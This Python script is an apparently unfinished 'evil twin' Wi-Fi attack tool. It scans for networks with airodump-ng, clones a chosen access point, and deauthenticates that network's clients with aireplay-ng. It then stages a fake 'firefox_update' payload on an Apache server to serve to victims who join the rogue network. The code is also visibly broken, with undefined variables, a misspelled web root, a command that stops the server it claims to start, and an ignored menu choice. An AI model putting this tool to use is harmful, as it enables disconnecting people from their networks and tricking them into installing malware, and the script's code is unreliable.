import csv 
import time
import subprocess
import os
import argparse

def check_root():
    """
    Checks if program is run by the root user.
    """
    if os.geteuid() != 0:
        exit("run it as root")


def print_welcome():
    """
    Welcomes the user to the program
    """
    print("Firefox Cena allows the user")



def monitor_mode(interface):
    '''
    Sets the chosen network interface to monitor mode using airmon-ng
    '''
    try:
        print("[-] initializing network interface...")
        cmd = ['sudo', 'airmon-ng', 'start', interface]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        output = result.stdout
        print("[+] initialized network interface!")
        mon_interface = parse_monitor_interface(output)
        return mon_interface

    except:
        print("Error occured during Interface Initialization")

def parse_monitor_interface(output):
    '''
    given the output from airmon-ng, finds the new name of the 
    network interface as a monitor mode interface 
    '''
    print("[-] finding new monitor interface...")
    output = output.split('\n')
    for idx in range(0, len(output)):
        line = output[idx]
        if 'PHY' in line and 'Interface' in line: 
            # skip a line and we will find our new monitor interface
            mon_interface = output[idx + 2]
            mon_interface = mon_interface.split("\t")[1]
            print("[+] found new monitor interface!")
            return mon_interface
    print('[!] Error finding monitor interface')
    exit()


def collect_target_data(mon_interface, log_prefix):
    '''
    Given an interface which has been put into monitor mode, 
    performs a 30 second wirless packet capture using airmon-ng

    args:
        mon_interface(str): name of the monitor mode enabled network interface
        log_prefix(str): name of prefix for log files 

    return:
        networks(dictionary): target data to be presented to user; total packets captured:(bssid, essid)
    '''

    try:
        print('[-] aggregating data for potential target networks...')
        networks = {}

        log_file = log_prefix + '-01.csv'
        cmd = 'sudo airodump-ng {} -w {}'.format(mon_interface, log_prefix)
        # execute for 30 seconds, then kill

        proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        time.sleep(6)
        proc.kill()
        


        # to store bssids and essids
        ids = {}
        # read csv, get stats to present to user
        with open (log_file, 'r') as f:
            lines = f.readlines()
            get_packets= False
            for line in lines:
                # if we are at bottom section of data
                if get_packets:
                    data = line.split(',')
                    if len(data) > 1:
                        # Total Packets
                        packets = data[-3]
                        # BSSID
                        bssid = data[-2].replace('\n', '').lstrip(" ")
                        # ESSID
                        essid = data[-1].replace('\n', '').lstrip(" ")
                        for real_bssid, real_essid in ids.items():
                            if (bssid and real_bssid):
                                if bssid == real_bssid:
                                    networks[packets] = (real_bssid, real_essid)
                                    break

                            if (essid and real_essid):
                                if essid == real_essid:
                                    networks[packets] = (real_bssid, real_essid)
                                    break

                else: 
                    data = line.split(',')
                    if (not "BSSID" in line) and (not 'Station MAC' in line) and len(data) > 10:
                        ids[data[0].replace('\n', '').lstrip(" ")] = data[-2].replace('\n', '').lstrip(" ")
                    
                if 'Station MAC' in line:
                    # begin tracking packets 
                    get_packets = True

        print('[+] aggregated data for potential target networks!')
        return networks
    except:
        print('[!] error aggregating data for target networks')
        clean()
        exit()


def user_network_decision(network_data):
    '''
    Given a dictionary containing bssids as names and a tuple
    containing total packets and essid, allows to user to decide which network 
    they would like to clone during the evil twin attack
    '''
    try:
        print("\n\ntargets found for our evil-twin attack!\nthe higher the number of packets transmitted the more likely a victim on the network will be found\nbe sure to choose a network which you own or have permission to be monkeying with\n ")
        print("Here are the available target networks:")

        trimmed_data = {int(key.replace(" ", "")): val for key, val in network_data.items()}
        keys = [*trimmed_data]
        keys.sort(reverse=True)

        # sort in descending order
        print ('[index]: Packets -- BSSID -- ESSID')
        print ('--------------------------------------------------')
        for idx in range(0,len(keys)):
            packets = keys[idx]
            bssid = trimmed_data[keys[idx]][0]
            essid = trimmed_data[keys[idx]][1]
            print("[{}]: {} -- {} -- {}".format(idx, packets, bssid, essid))
        decision = int(input("Enter the number of the network you'd like to clone:"))
        if decision < 0 or decision >= len(keys):
            print("fucked up on the input m8")
            exit()
        else:
            decision = keys[idx]
        return trimmed_data[decision]
    except:
        print("[!] error parsing network data!")
        clean()
        exit()


    
def clone_network(network, mon_interface, channel=1):
    '''
    clones the user-selected network 

    params:
        - network(tuple): (bssid,essid)
        - mon_interface(string): name of the monitor mode interface
        - channel(int): wireless channel to deploy network on 
    returns:
        - net_clone_process(process): process responsible for running rogue AP
    '''
    try:
    
        print("[-] cloning {}...".format(network[1]))
        print(channel)
        print(network)
        print(mon_interface)
        net_clone_proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
        print("[+] cloned {}!".format(network[1]))
        return net_clone_proc
    except:
        print("[!] error cloning network")
        clean()
        exit()



def deauth_clients(bssid, mon_interface):
    '''
    disconnects clients from target AP that we cloned

    params:
        bssid(string): bssid of the original AP that we want to disconnect clients from
        interface(string): interface used for deauthing clients
    '''

    try:
        print("[-] deauthing clients...")

        cmd = 'sudo aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'.format(network[0], mon_interface)
        proc = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)

        print("[+] deauthed clients!")
    except:
        print("[!] error deauthing clients!")
        clean()
        exit()


'''
provide fake access point with internet access (to be completed in version 1.1 for stealth mode)
def bridge_internet():

    try:
        print("[-] bridging internet access...")

        cmd = 'sudo aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'.format(network[0], mon_interface)
        proc = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)

        print("[+] bridged internet access!")
    except:
        print("[!] error bridging internet access!")
        clean()
        exit()


'''

def launch_evil_server():
    '''
    copies html files and payload to apache system directory, then starts apache
    '''

    try:
        print("[-] migrating files to evil web server...")
        cmd = ['sudo', 'cp', '-r', './firefox_update', '/var/wwww/html']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[+] migrated files to evil web server!")

        print("[-] starting evil web server...")
        cmd = ['sudo', 'systemctl', 'stop', 'apache2']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[+] started evil web server!")
        return
    except:
        print("[!] error starting evil web server!")
        clean()
        exit()



def redirect_dns():
    pass
# setup dnschef

def restore_dns():
    pass

def clean(mon_interface, net_clone_proc):
    '''
    restore monitor to managed mode, remove access point process,
    and stop apache websersver

    params:
        - mon_interface(string): monitor mode interface
        - net_clone_proc(subprocess): kills the network process
    '''
    try:
        print("[-] restoring network interface to managed mode...")
        cmd = ['sudo', 'airmon-ng', 'stop', mon_interface]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[+] restored network interface to managed mode!")

        print("[-] killing network cloning process...")
        net_clone_proc.kill()
        print("[+] killed network cloning process!")

        print("[-] killing evil web server...")
        cmd = ['sudo', 'systemctl', 'stop', 'apache2']
        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
        print("[+] killed evil web server!")

    except:
        print("Error occured during clean")

def main():
    """
    Main Driver
    """
    try:
        # create the log
        #log = open("./logs/process.log", "a")
        dump_prefix = 'dump'
        # check for root access
        check_root()
        # get the network interface from the user
        parser = argparse.ArgumentParser()
        parser.add_argument('rogue-ap-interface', help='network interface to use to create rogue access point', type=str)
        parser.add_argument('upstream-interface', help='network interface to use to maintain upstream internet connectivity', type=str)
        args = parser.parse_args()
        interface = args.interface
        # change the network card to monitor mode
        mon_interface = monitor_mode(interface)
        # capture wireless packets (recon)
        network_data = collect_target_data(mon_interface, dump_prefix)
        # present user with option of network to clone and allow for them to decide
        target_network = user_network_decision(network_data)
        # create the evil twin
        net_clone_proc = clone_network(target_network, mon_interface)
        # launch evil web server
        launch_evil_server()
        # let other clients know to use this machine as dns resolver
        redirect_dns()
        # deauthorize clients of legitimate network
        deauth_clients()

        clean(mon_interface, net_clone_proc)
    except: 
        clean(mon_interface, net_clone_proc)
        exit()



if __name__ == '__main__':
    main()
